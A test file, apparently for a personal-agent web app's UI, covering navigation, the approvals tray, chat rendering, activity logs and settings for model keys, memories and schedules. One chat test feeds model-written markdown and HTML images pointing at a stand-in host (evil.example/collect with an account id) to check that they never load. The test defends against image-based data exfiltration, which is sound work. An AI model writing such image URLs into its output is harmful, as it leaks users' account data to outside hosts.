import { act, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { TranscriptMessage } from "../../src/protocol";
import type { ActivityEntry, ActivityTask, Card, PoppyClientFrame } from "../../src/poppy/wire";
import type { Entitlement } from "../../src/model-router";
import { Workspace } from "../../src/ui/shell";
import type { PiSession, PoppyView } from "../../src/use-pi-session";

/**
 * The signed-in page (`src/ui/shell.tsx`) with a fixture in place of the
 * WebSocket: the rail and its four places, the tray of things that need the
 * User, the Activity and Companies pages, and Settings. Every frame a click
 * sends is recorded, and nothing is sent without one.
 */

const IDENTITY = { email: "ada@example.com", provider: "google" as const };

const approval: Card = {
  id: "approval-1",
  kind: "approval",
  company: "Acme",
  open: true,
  approvalId: "ap_42",
  summary: "Acme: submit the form #checkout on the website",
  status: "pending"
};

const signIn: Card = {
  id: "signin-1",
  kind: "signin_link",
  company: "Globex",
  open: true,
  signInId: "s1",
  url: "https://auth.globex.example/authorize",
  scopes: [{ scope: "poppy:read", description: "View account information" }],
  reason: "To see your orders"
};

const done: Card = { id: "notice-1", kind: "notice", company: "Acme", open: false, text: "Signed in to Acme." };

function session(patch: Partial<PiSession> = {}, poppy: Partial<PoppyView> = {}) {
  const sent: PoppyClientFrame[] = [];
  const submitted: string[] = [];
  const value: PiSession = {
    messages: [],
    live: null,
    running: false,
    tools: [],
    queued: 0,
    retry: null,
    model: { provider: "anthropic", modelId: "anthropic/claude-sonnet-5-5" },
    error: null,
    status: "open",
    catalog: [],
    poppy: { cards: [], accounts: [], permissions: [], direct: {}, activity: null, protocol: { companies: null, logs: {} }, ...poppy },
    submit: (text: string) => void submitted.push(text),
    abort: () => undefined,
    reset: () => undefined,
    sendPoppy: (frame: PoppyClientFrame) => void sent.push(frame),
    ...patch
  } as PiSession;
  return { value, sent, submitted };
}

function open(path: string, fixture = session()) {
  window.history.replaceState(null, "", path);
  const result = render(<Workspace identity={IDENTITY} session={fixture.value} />);
  return { ...result, ...fixture };
}

const DEMO: Entitlement = {
  lane: "demo",
  reason: null,
  key: null,
  demo: { spentUsd: 0.5, capUsd: 2, domainCapped: false, resetsAt: Date.UTC(2026, 9, 12) },
  model: { provider: "cloudflare", id: "anthropic/claude-sonnet-5-5", name: "Claude Sonnet 5.5" }
};

/** `fetch` for the page: the agent's identity, and `/api/entitlement` answering `entitlement`. */
function stubFetch(entitlement: Entitlement = DEMO) {
  vi.stubGlobal(
    "fetch",
    vi.fn(async (input: RequestInfo | URL) =>
      String(input) === "/poppy/client.json"
        ? Response.json({ client_id: "https://agent.example/poppy/client.json", client_name: "Durable Personal Agent" })
        : String(input) === "/api/entitlement"
          ? Response.json(entitlement)
          : new Response("Not found", { status: 404 })
    )
  );
}

beforeEach(() => {
  document.title = "Personal agent";
  stubFetch();
});

afterEach(() => {
  vi.unstubAllGlobals();
  window.history.replaceState(null, "", "/");
  vi.useRealTimers();
});

describe("rail", () => {
  it("has the four places, marks the current one, and moves between them without reloading", () => {
    open("/");
    const rail = screen.getByRole("navigation", { name: "Places" });
    const links = within(rail).getAllByRole("link");
    expect(links.map((link) => link.textContent)).toEqual(["Chat", "Activity", "Companies", "Settings"]);
    expect(links.map((link) => link.getAttribute("href"))).toEqual(["/", "/activity", "/companies", "/settings"]);
    expect(within(rail).getByRole("link", { name: "Chat" }).getAttribute("aria-current")).toBe("page");

    fireEvent.click(within(rail).getByRole("link", { name: "Activity" }));
    expect(window.location.pathname).toBe("/activity");
    expect(screen.getByRole("heading", { level: 1, name: "Activity" })).toBeTruthy();
    expect(within(rail).getByRole("link", { name: "Activity" }).getAttribute("aria-current")).toBe("page");
    expect(within(rail).getByRole("link", { name: "Chat" }).getAttribute("aria-current")).toBeNull();

    fireEvent.click(within(rail).getByRole("link", { name: "Companies" }));
    expect(screen.getByRole("heading", { level: 1, name: "Companies" })).toBeTruthy();

    // Back goes back.
    act(() => {
      window.history.back();
    });
    return waitFor(() => expect(screen.getByRole("heading", { level: 1, name: "Activity" })).toBeTruthy());
  });

  it("opens straight to a place from its address", () => {
    open("/settings");
    expect(screen.getByRole("heading", { level: 1, name: "Settings" })).toBeTruthy();
  });

  it("leaves a modified click to the browser, so the place can open in a new tab", () => {
    open("/");
    const link = screen.getByRole("link", { name: "Activity" });
    // fireEvent returns false when the page called preventDefault.
    expect(fireEvent.click(link, { metaKey: true })).toBe(true);
    expect(screen.queryByRole("heading", { level: 1, name: "Activity" })).toBeNull();
    expect(fireEvent.click(link)).toBe(false);
    expect(screen.getByRole("heading", { level: 1, name: "Activity" })).toBeTruthy();
  });

  it("shows who is signed in and a way to sign out, and no model or connection chips", () => {
    const { container } = open("/");
    expect(screen.getByText("ada@example.com")).toBeTruthy();
    const signOut = screen.getByRole("button", { name: "Sign out" });
    expect(signOut.closest("form")!.getAttribute("action")).toBe("/logout");
    expect(signOut.closest("form")!.getAttribute("method")).toBe("post");
    expect(container.textContent).not.toMatch(/Live|Claude Sonnet|Powered by|Cloudflare/);
  });
});

describe("needs-you tray", () => {
  it("is pinned above the conversation, counts what needs the User, and puts the count in the rail and the title", () => {
    const fixture = session(
      { messages: Array.from({ length: 30 }, (_, index): TranscriptMessage => ({ id: `m${index}`, role: "user", parts: [{ type: "text", text: `message ${index}` }], timestamp: index })) },
      { cards: [approval, signIn, done] }
    );
    open("/", fixture);
    const tray = screen.getByRole("region", { name: /Needs you/ });
    expect(within(tray).getByRole("heading", { name: /Needs you/ }).textContent).toBe("Needs you2");
    expect(within(tray).getByText("Acme: submit the form #checkout on the website")).toBeTruthy();
    expect(within(tray).getByRole("link", { name: /Sign in on Globex's page/ })).toBeTruthy();

    // Pinned: outside the part that scrolls, and before it.
    const transcript = screen.getByText("message 0").closest(".overflow-y-auto")!;
    expect(transcript.contains(tray)).toBe(false);
    expect(tray.compareDocumentPosition(transcript) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy();

    // The resolved notice is a receipt in the conversation, not in the tray.
    expect(within(tray).queryByText("Signed in to Acme.")).toBeNull();
    expect(within(transcript as HTMLElement).getByText("Signed in to Acme.")).toBeTruthy();

    expect(screen.getByRole("link", { name: /^Chat\s*, 2 things need you$/ })).toBeTruthy();
    expect(document.title).toBe("(2) Personal agent");
  });

  it("sends a decision only on a click", () => {
    const { sent } = open("/", session({}, { cards: [approval] }));
    expect(sent).toEqual([]);
    fireEvent.click(screen.getByRole("button", { name: "Approve" }));
    expect(sent).toEqual([{ type: "poppy.approval", approvalId: "ap_42", decision: "approve" }]);
  });

  it("holds failures that need the User until they dismiss them", () => {
    const failed: Card = { id: "error-1", kind: "notice", company: "", open: false, text: "That didn't work: Acme is unreachable" };
    const { sent } = open("/", session({}, { cards: [failed] }));
    const tray = screen.getByRole("region", { name: /Needs you/ });
    expect(within(tray).getByText(/Acme is unreachable/)).toBeTruthy();
    fireEvent.click(within(tray).getByRole("button", { name: "Dismiss" }));
    expect(sent).toEqual([{ type: "poppy.card.dismiss", id: "error-1" }]);
  });

  it("isn't there, and the title has no count, when nothing needs the User", () => {
    open("/", session({}, { cards: [done] }));
    expect(screen.queryByRole("region", { name: /Needs you/ })).toBeNull();
    expect(document.title).toBe("Personal agent");
    expect(screen.getByRole("link", { name: "Chat" })).toBeTruthy();
  });

  it("keeps a hidden Direct Conversation one click away", () => {
    const fixture = session({}, { direct: { c1: { conversationId: "c1", company: "Acme", status: "open", responder: "human", messages: [] } } });
    open("/", fixture);
    const sheet = screen.getByRole("complementary", { name: "Conversation with Acme" });
    expect(within(sheet).getByText("A person at Acme is answering · Your words go as written, from you")).toBeTruthy();
    fireEvent.click(within(sheet).getByRole("button", { name: "Hide conversation" }));
    expect(screen.queryByRole("complementary", { name: "Conversation with Acme" })).toBeNull();
    expect(document.title).toBe("(1) Personal agent");
    fireEvent.click(screen.getByRole("button", { name: "Open conversation" }));
    expect(screen.getByRole("complementary", { name: "Conversation with Acme" })).toBeTruthy();
    expect(fixture.sent).toEqual([]);
  });
});

describe("chat", () => {
  it("says what the agent can do before the first message", () => {
    open("/");
    expect(screen.getByRole("heading", { name: "Your agent works with companies for you" })).toBeTruthy();
    for (const text of [/finds the company/i, /sign in on the company's own page/i, /only with your approval/i, /keeps working while you're away/i]) {
      expect(screen.getByText(text)).toBeTruthy();
    }
  });

  it("never loads a remote image the model writes, in markdown or HTML: it becomes a link", async () => {
    const exfiltrate = "https://evil.example/collect?d=acct_ada";
    const text = [
      "Here is your order.",
      `![receipt](${exfiltrate})`,
      `<img src="${exfiltrate}&via=html" alt="pixel">`,
      `<picture><source srcset="${exfiltrate}&via=source"><img src="/logo.svg" alt="logo"></picture>`
    ].join("\n\n");
    const messages: TranscriptMessage[] = [
      { id: "1", role: "user", parts: [{ type: "text", text: "Show me my receipt" }], timestamp: 1 },
      { id: "2", role: "assistant", parts: [{ type: "text", text }], timestamp: 2 }
    ];
    const { container } = open("/", session({ messages }));
    await waitFor(() => expect(container.querySelector(`img[alt="logo"]`)).toBeTruthy());
    // Nothing that would load points anywhere but here.
    const loads = [...container.querySelectorAll("[src], [srcset]")].flatMap((element) =>
      ["src", "srcset"].flatMap((name) => (element.hasAttribute(name) ? [element.getAttribute(name)!] : []))
    );
    expect(loads.filter((value) => !value.startsWith("data:") && new URL(value, location.href).origin !== location.origin)).toEqual([]);
    expect(container.innerHTML).not.toMatch(/src(set)?="https:\/\/evil/);
    // An image of our own still shows.
    expect(screen.getByRole("img", { name: "logo" }).getAttribute("src")).toBe("/logo.svg");
    // The remote ones are links the User can choose to follow, never loaded.
    expect(screen.getByRole("link", { name: "[Image: receipt]" }).getAttribute("href")).toBe(exfiltrate);
    expect(screen.getByRole("link", { name: "[Image: pixel]" }).getAttribute("href")).toBe(`${exfiltrate}&via=html`);
  });

  it("shows a Poppy tool call as one readable line, with the raw call behind Details", () => {
    const messages: TranscriptMessage[] = [
      { id: "1", role: "user", parts: [{ type: "text", text: "Where's my order?" }], timestamp: 1 },
      {
        id: "2",
        role: "assistant",
        parts: [
          { type: "tool-call", id: "call_1", name: "poppy_api_call", arguments: { domain: "acme.example", operation: "GET /orders" } },
          { type: "tool-call", id: "call_2", name: "read_file", arguments: { path: "notes.txt" } }
        ],
        timestamp: 2
      },
      {
        id: "3",
        role: "tool",
        parts: [{ type: "tool-result", id: "call_1", name: "poppy_api_call", content: [{ type: "text", text: '{"status":200,"body":{"orders":[]}}' }], details: { status: 200, body: { orders: [] } }, error: false }],
        timestamp: 3
      },
      { id: "4", role: "tool", parts: [{ type: "tool-result", id: "call_2", name: "read_file", content: [{ type: "text", text: "hello" }], error: false }], timestamp: 4 }
    ];
    const { container } = open("/", session({ messages }));
    expect(screen.getByText("Read orders at acme.example")).toBeTruthy();
    expect(screen.getByText(/· API · view access/)).toBeTruthy();
    // The raw call and result only on request.
    expect(container.textContent).not.toContain('"operation"');
    const details = screen.getAllByRole("button", { name: "Details" });
    expect(details).toHaveLength(2);
    fireEvent.click(details[0]!);
    expect(details[0]!.getAttribute("aria-expanded")).toBe("true");
    expect(container.textContent).toContain('"operation": "GET /orders"');
    // Other tools keep a compact card with their own name.
    expect(container.querySelector('[data-tool="read_file"]')!.textContent).toContain("read_file");
    // The result is shown once, with its call, not again on its own.
    expect(container.querySelectorAll('[data-tool="poppy_api_call"]')).toHaveLength(1);
  });

  it("shows a single status while the agent works, and no streaming cursor", () => {
    const { container } = open("/", session({ running: true, tools: [{ callId: "c", name: "poppy_discover", output: "" }] }));
    expect(screen.getAllByRole("status").filter((node) => node.textContent?.includes("Working"))).toHaveLength(1);
    expect(container.querySelector(".streaming-cursor")).toBeNull();
    // One spinner (Kumo's Loader, an SVG), in that status; no other animation.
    expect(container.querySelectorAll('svg[aria-label="Loading"]')).toHaveLength(1);
    expect(container.querySelectorAll(".animate-spin, [class*='animate-pulse']")).toHaveLength(0);
  });

  it("offers to send a message again when the model fails", () => {
    const messages: TranscriptMessage[] = [
      { id: "1", role: "user", parts: [{ type: "text", text: "Hello" }], timestamp: 1 },
      { id: "2", role: "assistant", parts: [], timestamp: 2, error: "x-api-key header is required" }
    ];
    const { submitted } = open("/", session({ messages }));
    expect(screen.getByRole("alert").textContent).toContain("x-api-key header is required");
    fireEvent.click(screen.getByRole("button", { name: "Send again" }));
    expect(submitted).toEqual(["Hello"]);
  });

  it("says quietly when it isn't connected, and why sending waits", () => {
    open("/", session({ status: "closed" }));
    expect(screen.getByRole("status").textContent).toMatch(/Reconnecting to your agent/);
    expect((screen.getByRole("button", { name: "Send message" }) as HTMLButtonElement).disabled).toBe(true);
    expect(screen.getByText("You can send once your agent is connected.")).toBeTruthy();
  });
});

describe("activity page", () => {
  it("shows placeholders until the agent sends its activity", () => {
    open("/activity");
    expect(screen.getByRole("status", { name: "Loading what's in progress" })).toBeTruthy();
    expect(screen.getByRole("status", { name: "Loading the log" })).toBeTruthy();
  });

  it("says what each empty part is for", () => {
    open("/activity", session({}, { activity: { inProgress: [], log: [] } }));
    expect(screen.getByText("Nothing running")).toBeTruthy();
    expect(screen.getByText("Nothing yet")).toBeTruthy();
  });

  it("lists work in progress with a way to stop it, and the log with how and who decided", () => {
    // A fixed clock, so the countdown reads exactly.
    vi.useFakeTimers({ toFake: ["Date"] });
    vi.setSystemTime(Date.UTC(2026, 9, 11, 9, 0, 0));
    const now = Date.now();
    const inProgress: ActivityTask[] = [
      {
        id: "signin-1",
        kind: "device_sign_in",
        issuer: "https://auth.acme.example",
        company: "Acme",
        what: "Waiting for you to sign in at Acme on another device",
        since: now - 60_000,
        until: now + 4 * 60_000 + 30_000,
        stop: { type: "poppy.signin.cancel", signInId: "s1" }
      },
      {
        id: "conversation-c1",
        kind: "conversation",
        issuer: "https://auth.acme.example",
        company: "Acme",
        what: "Listening for replies from Acme's agent",
        since: now - 120_000,
        stop: { type: "poppy.direct.close", conversationId: "c1" }
      }
    ];
    const log: ActivityEntry[] = [
      {
        id: "op-1",
        at: now - 5_000,
        kind: "operation",
        issuer: "https://auth.acme.example",
        company: "Acme",
        account: "a***@example.com",
        what: "Acme proposed",
        quote: "Exchange the blue jumper for size L.",
        quoteBy: "company",
        how: "api",
        access: "view_and_change",
        decidedBy: "standing_permission",
        result: "done",
        outcome: "Exchange booked.",
        outcomeBy: "company"
      }
    ];
    const { sent } = open("/activity", session({}, { activity: { inProgress, log } }));
    const running = screen.getByRole("list", { name: "In progress" });
    expect(within(running).getByText(/Expires in 4:30\b/)).toBeTruthy();
    fireEvent.click(within(running).getByRole("button", { name: "Cancel sign-in" }));
    fireEvent.click(within(running).getByRole("button", { name: "End conversation" }));
    expect(sent).toEqual([
      { type: "poppy.signin.cancel", signInId: "s1" },
      { type: "poppy.direct.close", conversationId: "c1" }
    ]);

    const row = within(screen.getByRole("table")).getAllByRole("row")[1]!;
    expect(within(row).getByText("Acme proposed “Exchange the blue jumper for size L.”")).toBeTruthy();
    expect(within(row).getByText("Acme says: Exchange booked.")).toBeTruthy();
    expect(within(row).getByText("view and change access")).toBeTruthy();
    expect(within(row).getByText(/^API · view and change access · Decided by: Standing permission$/)).toBeTruthy();
    expect(within(row).getByText("Standing permission")).toBeTruthy();
    expect(within(row).getByText("Done")).toBeTruthy();
  });

  it("renders only the fields it knows, so nothing secret-looking can reach the page", () => {
    const entry = {
      id: "signin-2",
      at: Date.now(),
      kind: "sign_in",
      issuer: "https://auth.acme.example",
      company: "Acme",
      account: null,
      what: "Sign-in at Acme on its own page",
      how: "sign_in",
      access: "view",
      decidedBy: "you",
      result: "done",
      token: "tok_SECRET_123",
      secret: "sealed_SECRET_456",
      device_code: "dc_SECRET_789",
      password: "hunter2"
    } as unknown as ActivityEntry;
    const task = {
      id: "t",
      kind: "conversation",
      issuer: "https://auth.acme.example",
      company: "Acme",
      what: "Listening for replies from Acme's agent",
      since: Date.now(),
      code: "123456"
    } as unknown as ActivityTask;
    const { container } = open("/activity", session({}, { activity: { inProgress: [task], log: [entry] } }));
    expect(screen.getByText("Sign-in at Acme on its own page")).toBeTruthy();
    for (const value of ["tok_SECRET_123", "sealed_SECRET_456", "dc_SECRET_789", "hunter2", "123456"]) {
      expect(container.innerHTML).not.toContain(value);
    }
    // A task without a stop frame offers no button.
    expect(within(screen.getByRole("list", { name: "In progress" })).queryByRole("button")).toBeNull();
  });
});

describe("companies page", () => {
  const accounts = [{ issuer: "https://auth.acme.example", company: "Acme", account: "a***@example.com", scope: "poppy:read poppy:write", expiresAt: null }];

  it("opens a Company from the table, with its own address, and ends an open conversation", () => {
    const activity = {
      inProgress: [
        {
          id: "conversation-c1",
          kind: "conversation" as const,
          issuer: "https://auth.acme.example",
          company: "Acme",
          what: "Listening for replies from Acme's agent",
          since: Date.now(),
          stop: { type: "poppy.direct.close" as const, conversationId: "c1" }
        }
      ],
      log: []
    };
    const { sent } = open("/companies", session({}, { accounts, activity }));
    fireEvent.click(within(screen.getByRole("table")).getByRole("button", { name: "Acme" }));
    expect(window.location.search).toBe(`?company=${encodeURIComponent("https://auth.acme.example")}`);
    expect(screen.getByRole("heading", { level: 1, name: "Acme" })).toBeTruthy();
    fireEvent.click(screen.getByRole("button", { name: "End conversation" }));
    fireEvent.click(screen.getByRole("button", { name: "Sign out of Acme" }));
    expect(sent).toEqual([
      { type: "poppy.direct.close", conversationId: "c1" },
      { type: "poppy.signout", issuer: "https://auth.acme.example", account: "a***@example.com" }
    ]);
  });

  it("says what will appear when there are no Companies", () => {
    open("/companies");
    expect(screen.getByText("No Companies yet")).toBeTruthy();
  });
});

describe("settings page", () => {
  it("shows the account, the model and the agent's public identity", async () => {
    open("/settings");
    expect(screen.getByText(/Signed in as/).textContent).toBe("Signed in as ada@example.com with Google.");
    expect(screen.getByRole("button", { name: "Sign out of this agent" })).toBeTruthy();
    expect(await screen.findByText("anthropic/claude-sonnet-5-5")).toBeTruthy();
    expect(screen.getByText(/Using the demo \(Claude Sonnet 5.5\)/)).toBeTruthy();
    expect(await screen.findByText("https://agent.example/poppy/client.json")).toBeTruthy();
    expect(screen.getByText("Durable Personal Agent")).toBeTruthy();
    // The key is a password field; the only visible text field is the Anthropic workspace ID, which isn't a secret.
    expect(screen.getAllByRole("textbox").map((field) => field.getAttribute("placeholder"))).toEqual(["wrkspc_…"]);
  });

  it("says where the identity lives when this address doesn't serve it", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => new Response("Not found", { status: 404 })));
    open("/settings");
    expect(await screen.findByText(/served only at the agent's public address/)).toBeTruthy();
  });

  it("switches the theme and remembers it", () => {
    // Node's own (disabled) localStorage hides happy-dom's, so give the page one.
    const store = new Map<string, string>();
    vi.stubGlobal("localStorage", {
      getItem: (key: string) => store.get(key) ?? null,
      setItem: (key: string, value: string) => void store.set(key, value),
      removeItem: (key: string) => void store.delete(key)
    });
    open("/settings");
    fireEvent.click(screen.getByRole("radio", { name: "Dark" }));
    expect(document.documentElement.getAttribute("data-mode")).toBe("dark");
    expect(localStorage.getItem("theme")).toBe("dark");
    fireEvent.click(screen.getByRole("radio", { name: "Match this device" }));
    expect(localStorage.getItem("theme")).toBeNull();
  });
});

describe("model settings", () => {
  const NO_KEY: Entitlement = { lane: "none", reason: "no_key", key: null, demo: null, model: null };
  const OWN_KEY: Entitlement = {
    lane: "own_key",
    reason: null,
    key: { provider: "anthropic", status: "valid", source: "pasted", addedAt: Date.UTC(2026, 9, 11), workspace: null },
    demo: null,
    model: { provider: "anthropic", id: "claude-sonnet-5-5", name: "Claude Sonnet 5.5" }
  };

  it("shows today's demo spend as a meter, and the deployment's operator's access to keys", async () => {
    open("/settings");
    const meter = await screen.findByRole("meter", { name: "Demo allowance used today" });
    expect(meter.getAttribute("aria-valuenow")).toBe("0.5");
    expect(meter.getAttribute("aria-valuemax")).toBe("2");
    expect(screen.getByText("$0.50 of $2.00 used today")).toBeTruthy();
    expect(screen.getByText(/Whoever runs this deployment could read it/)).toBeTruthy();
    expect(screen.getByText(/set a spending limit on the key with your provider/)).toBeTruthy();
  });

  it("offers a pasted Anthropic or OpenAI key, and nothing else", async () => {
    stubFetch(NO_KEY);
    const { container } = open("/settings");
    await screen.findByLabelText("API key");
    const providers = screen.getAllByRole("radio").filter((radio) => radio.getAttribute("name") === "model-key-provider");
    expect(providers.map((radio) => radio.getAttribute("value"))).toEqual(["anthropic", "openai"]);
    expect(container.querySelector('a[href^="/auth/"]')).toBeNull();
    expect(container.textContent).not.toMatch(/openrouter/i);
  });

  it("says plainly when the agent needs a key, on every place, and leads to Settings", async () => {
    stubFetch(NO_KEY);
    open("/");
    expect((await screen.findByText("Your agent needs a model key before it can answer.")).closest("[role=status]")).toBeTruthy();
    fireEvent.click(screen.getByRole("link", { name: "Add a key in Settings" }));
    expect(window.location.pathname).toBe("/settings");
    expect(await screen.findByText("Needs a key: your agent can't call a model until you add one.")).toBeTruthy();
    expect(screen.getByText("None until your agent has a key or the demo")).toBeTruthy();
  });

  it("says a refused key stopped the agent, with no demo fallback", async () => {
    stubFetch({ ...OWN_KEY, lane: "none", reason: "key_invalid", key: { ...OWN_KEY.key!, status: "invalid" }, model: null });
    open("/settings");
    expect(await screen.findByText(/Anthropic refused your key, so your agent has stopped calling the model. It won't fall back to the demo./)).toBeTruthy();
  });

  it("sends a pasted key once, then shows only its provider", async () => {
    const posted: Array<{ method: string; body: unknown }> = [];
    const key = "sk-ant-test-good-0123456789abcdef";
    vi.stubGlobal(
      "fetch",
      vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
        if (String(input) === "/api/entitlement") return Response.json(NO_KEY);
        if (String(input) === "/api/model-key") {
          posted.push({ method: init?.method ?? "GET", body: init?.body ? JSON.parse(String(init.body)) : null });
          return init?.method === "DELETE" ? Response.json(NO_KEY) : Response.json(OWN_KEY);
        }
        return new Response("Not found", { status: 404 });
      })
    );
    const { container } = open("/settings");
    const input = (await screen.findByLabelText("API key")) as HTMLInputElement;
    expect(input.type).toBe("password");
    fireEvent.change(input, { target: { value: key } });
    fireEvent.click(screen.getByRole("button", { name: "Check and save key" }));
    expect(await screen.findByText(/Using your/)).toBeTruthy();
    expect(screen.getByText(/Using your/).textContent).toContain("Anthropic key for Claude Sonnet 5.5");
    expect(posted).toEqual([{ method: "POST", body: { provider: "anthropic", key } }]);
    expect(input.value).toBe("");
    expect(container.innerHTML).not.toContain(key);

    fireEvent.click(screen.getByRole("button", { name: "Remove key" }));
    expect(await screen.findByText("Needs a key: your agent can't call a model until you add one.")).toBeTruthy();
    expect(posted.at(-1)).toEqual({ method: "DELETE", body: null });
  });

  it("offers a workspace ID for Anthropic keys only, and sends it only when given", async () => {
    const posted: unknown[] = [];
    vi.stubGlobal(
      "fetch",
      vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
        if (String(input) === "/api/entitlement") return Response.json(NO_KEY);
        if (String(input) === "/api/model-key") {
          posted.push(JSON.parse(String(init?.body)));
          return Response.json({ ...OWN_KEY, key: { ...OWN_KEY.key!, workspace: "wrkspc_01Test" } });
        }
        return new Response("Not found", { status: 404 });
      })
    );
    open("/settings");
    const key = (await screen.findByLabelText("API key")) as HTMLInputElement;
    const workspace = screen.getByLabelText(/Workspace ID/) as HTMLInputElement;
    expect(workspace.type).toBe("text");
    fireEvent.click(screen.getByRole("radio", { name: "OpenAI" }));
    expect(screen.queryByLabelText(/Workspace ID/)).toBeNull();
    fireEvent.click(screen.getByRole("radio", { name: "Anthropic" }));
    fireEvent.change(key, { target: { value: "sk-ant-test-unscoped-0123456789" } });
    fireEvent.change(screen.getByLabelText(/Workspace ID/), { target: { value: " wrkspc_01Test " } });
    fireEvent.click(screen.getByRole("button", { name: "Check and save key" }));
    expect(await screen.findByText(/Using your/)).toBeTruthy();
    expect(screen.getByText(/Using your/).textContent).toContain("in workspace wrkspc_01Test");
    expect(posted).toEqual([{ provider: "anthropic", key: "sk-ant-test-unscoped-0123456789", workspace: "wrkspc_01Test" }]);
  });

  it("shows the agent's refusal of a key, and keeps what was typed", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn(async (input: RequestInfo | URL) =>
        String(input) === "/api/entitlement"
          ? Response.json(NO_KEY)
          : String(input) === "/api/model-key"
            ? Response.json({ error: "Anthropic refused that key." }, { status: 400 })
            : new Response("Not found", { status: 404 })
      )
    );
    open("/settings");
    const input = (await screen.findByLabelText("API key")) as HTMLInputElement;
    fireEvent.change(input, { target: { value: "sk-ant-test-bad-0123456789" } });
    fireEvent.click(screen.getByRole("button", { name: "Check and save key" }));
    expect((await screen.findByRole("alert")).textContent).toBe("Anthropic refused that key.");
    expect(input.getAttribute("aria-invalid")).toBe("true");
  });
});

describe("memory settings", () => {
  const NOTES = [
    { id: 2, text: "Prefers trains to planes", source: "agent", createdAt: Date.UTC(2026, 9, 11) },
    { id: 1, text: "Vegetarian", source: "user", createdAt: Date.UTC(2026, 9, 10) }
  ];

  /** `/api/memories` answering `notes`, recording each call; deleting removes notes as the agent would. */
  function stubMemories(notes = NOTES) {
    let held = [...notes];
    const calls: string[] = [];
    vi.stubGlobal(
      "fetch",
      vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
        const url = String(input);
        if (url === "/api/entitlement") return Response.json(DEMO);
        if (!url.startsWith("/api/memories")) return new Response("Not found", { status: 404 });
        const method = init?.method ?? "GET";
        calls.push(`${method} ${url}`);
        if (method === "GET") return Response.json({ memories: held, limit: 200 });
        if (url === "/api/memories") {
          const forgotten = held.length;
          held = [];
          return Response.json({ forgotten });
        }
        held = held.filter((note) => `/api/memories/${note.id}` !== url);
        return new Response(null, { status: 204 });
      })
    );
    return calls;
  }

  it("lists each note with whose it is, and deletes one with its own button", async () => {
    const calls = stubMemories();
    open("/settings");
    const list = await screen.findByRole("list", { name: "Your agent's notes" });
    expect(within(list).getAllByRole("listitem").map((item) => item.textContent)).toEqual([
      expect.stringMatching(/^Prefers trains to planesYour agent noted, /),
      expect.stringMatching(/^VegetarianYou said, /)
    ]);
    expect(screen.getByText(/2 of 200 notes\. Kept in your agent's storage until you delete them/)).toBeTruthy();
    fireEvent.click(screen.getByRole("button", { name: "Delete note: Vegetarian" }));
    await waitFor(() => expect(screen.queryByText("Vegetarian")).toBeNull());
    expect(calls).toEqual(["GET /api/memories", "DELETE /api/memories/1", "GET /api/memories"]);
  });

  it("forgets everything only after a second click, and can be cancelled", async () => {
    const calls = stubMemories();
    open("/settings");
    await screen.findByRole("list", { name: "Your agent's notes" });
    fireEvent.click(screen.getByRole("button", { name: "Forget everything" }));
    fireEvent.click(screen.getByRole("button", { name: "Keep them" }));
    expect(calls).toEqual(["GET /api/memories"]);
    fireEvent.click(screen.getByRole("button", { name: "Forget everything" }));
    fireEvent.click(screen.getByRole("button", { name: "Forget all 2" }));
    expect(await screen.findByText(/No notes yet/)).toBeTruthy();
    expect(calls).toEqual(["GET /api/memories", "DELETE /api/memories", "GET /api/memories"]);
  });
});

describe("scheduled settings", () => {
  const ITEMS = [
    {
      id: "sch_aaaaaaaaaa",
      kind: "reminder",
      text: "Call the bank",
      nextRun: Date.UTC(2026, 9, 12, 16, 0),
      repeats: "once",
      timeZone: "Europe/London",
      status: "active",
      failures: 0,
      lastRun: null,
      lastOutcome: null
    },
    {
      id: "sch_bbbbbbbbbb",
      kind: "task",
      text: "Check whether my print order has shipped",
      nextRun: Date.UTC(2026, 9, 13, 8, 0),
      repeats: "every weekday at 09:00",
      timeZone: "Europe/London",
      status: "paused",
      failures: 3,
      lastRun: Date.UTC(2026, 9, 12, 8, 0),
      lastOutcome: "failed"
    }
  ];

  /** `/api/schedules` answering `items`, recording each call; cancelling removes one as the agent would. */
  function stubSchedules(items = ITEMS) {
    let held = [...items];
    const calls: string[] = [];
    vi.stubGlobal(
      "fetch",
      vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
        const url = String(input);
        if (url === "/api/entitlement") return Response.json(DEMO);
        if (!url.startsWith("/api/schedules")) return new Response("Not found", { status: 404 });
        const method = init?.method ?? "GET";
        calls.push(`${method} ${url}`);
        if (method === "GET") return Response.json({ schedules: held, limit: 20 });
        held = held.filter((item) => `/api/schedules/${item.id}` !== url);
        return new Response(null, { status: 204 });
      })
    );
    return calls;
  }

  it("lists each reminder and task with what, when next, how it repeats and its status, and cancels one with its own button", async () => {
    const calls = stubSchedules();
    open("/settings");
    const list = await screen.findByRole("list", { name: "Your reminders and tasks" });
    const items = within(list).getAllByRole("listitem").map((item) => item.textContent);
    expect(items[0]).toMatch(/^ReminderCall the bankOnce · next .*17:00.* \(Europe\/London\)Cancel$/);
    expect(items[1]).toBe("TaskCheck whether my print order has shippedPaused after 3 failed runs in a rowCancel");
    expect(screen.getByText(/1 of 20 waiting/)).toBeTruthy();
    fireEvent.click(screen.getByRole("button", { name: "Cancel reminder: Call the bank" }));
    await waitFor(() => expect(screen.queryByText("Call the bank")).toBeNull());
    expect(calls).toEqual(["GET /api/schedules", "DELETE /api/schedules/sch_aaaaaaaaaa", "GET /api/schedules"]);
  });

  it("says how to ask for one when nothing is scheduled", async () => {
    stubSchedules([]);
    open("/settings");
    expect(await screen.findByText(/Nothing scheduled\. Ask your agent, for example “Remind me at 5pm to call the bank”/)).toBeTruthy();
  });
});

describe("notification settings", () => {
  const KEY = "BP4z9KsN6nGRTbVYI_c7VJSPQTBtkgcy27mlmlMoZIIgDll6e3vCYLocInmYWAmS6TlzAC8wEqKK6PBru3jl7A8";
  const SUBSCRIPTION = { endpoint: "https://fcm.googleapis.com/fcm/send/device", expirationTime: null, keys: { p256dh: "BCVx", auth: "BTBZ" } };

  /**
   * A browser that can take push messages: its service worker container, push
   * manager and notification permission, recording what the page asks of each.
   */
  function stubBrowser(permissionAfterAsking: NotificationPermission = "granted") {
    const log: string[] = [];
